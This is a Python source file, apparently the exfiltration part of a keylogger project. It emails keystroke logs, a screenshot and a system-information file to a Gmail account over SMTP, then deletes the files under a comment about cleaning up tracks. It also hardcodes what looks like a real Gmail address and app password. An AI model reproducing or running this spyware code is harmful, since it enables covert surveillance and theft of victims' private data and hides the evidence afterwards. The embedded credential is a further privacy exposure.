import smtplib
import ssl
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


# file
system_information = "systeminfo.txt"   # create system information file
screenshot_information = "screenshot.png"   # create png file
files = [system_information, screenshot_information]  # list of files to be attached

# file path
file_path ="C:\\Users\\sanke\\Documents\\pyprogram\\mainfolder"
extend = "\\" # Update with your desired file extension
file_merge = file_path + extend


smtp_server = "smtp.gmail.com"
port = 587
sender_email = " " # Put the sender email address
password = " "  # Put the sender email address password
receiver_email = " " # Put  the receiver email address

# function for send email of keyboard stocks
def sendEmail(message):
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = "samstark9990@gmail.com"
    password = "ytfs jwot ykie aesi"
    receiver_email = "samstark9990@gmail.com"

    context = ssl.create_default_context()

    try:
        with smtplib.SMTP(smtp_server, port) as server:
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message)
        print("Email sent successfully.")
    except Exception as e:
        print("Error: {}".format(e))

# function for sending email of files system informaion and screenshot.
def sendemailfile(filename, attachment, receiver_email):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s " % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(sender_email, password)
    text = msg.as_string()
    s.sendmail(sender_email, receiver_email, text)
    s.quit() 
    
       
sendemailfile(screenshot_information, file_path + extend + screenshot_information,receiver_email)
print("ScreenShot are successfully send to EMAIL")
sendemailfile(system_information, file_path + extend + system_information,receiver_email)
print("SYSTEM INFORMATION are successfully send to EMAIL")   
 
# Clean up our tracks and delete files
delete_files = [system_information,  screenshot_information]
for file in delete_files:
    os.remove(file_merge + file)
    